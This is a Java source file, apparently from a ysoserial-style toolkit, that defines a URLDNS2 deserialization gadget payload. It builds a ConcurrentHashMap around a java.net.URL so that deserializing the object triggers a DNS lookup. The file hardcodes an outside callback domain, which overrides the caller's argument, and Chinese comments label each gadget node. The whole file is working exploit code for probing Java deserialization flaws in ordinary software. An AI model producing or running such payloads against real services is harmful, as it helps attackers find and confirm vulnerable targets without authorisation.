package Node.payload;

import Node.node.ConcurrentHashMap_node;
import Node.node.URL_hashCode;
import Node.utils.PayloadRunner;

import java.net.URL;
import java.net.URLStreamHandler;
import java.util.concurrent.ConcurrentHashMap;

public class URLDNS2 implements ObjectPayload<Object>{
    public Object getObject(String url) throws Exception {
        url="http://ksek3.leiaffectionli.xyz";
        //URLStreamHandler_node 节点1
        URLStreamHandler handler=URLStreamHandler_node.return_node();

        //URL 节点2
        URL url1= URL_hashCode.return_node(url,handler);

        //ConcurrentHashMap_node 最后节点
        ConcurrentHashMap concurrentHashMap= ConcurrentHashMap_node.return_node();
        concurrentHashMap.put(url1,url);

        //节点2 触发调整
        URL_hashCode.return_hashcode(url1);

        return concurrentHashMap;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(URLDNS2.class, args);
    }


}
